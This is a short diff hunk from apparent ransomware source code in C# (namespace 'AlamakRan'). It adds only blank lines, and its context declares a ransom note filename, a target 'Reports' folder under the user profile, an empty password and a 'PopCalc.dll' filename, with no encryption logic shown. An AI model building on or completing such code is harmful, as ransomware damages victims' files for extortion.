@@ -154,7 +154,9 @@ namespace AlamakRan
             const string targetDir = "Reports";
             const string ransomNote = "ransom_note.txt";
             const string tempDir = "11";
+
             const string randomPassword = "";
+
             const string newFilename = "PopCalc.dll";
             string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
             string targetDirPath = userDirPath + @"\" + targetDir;
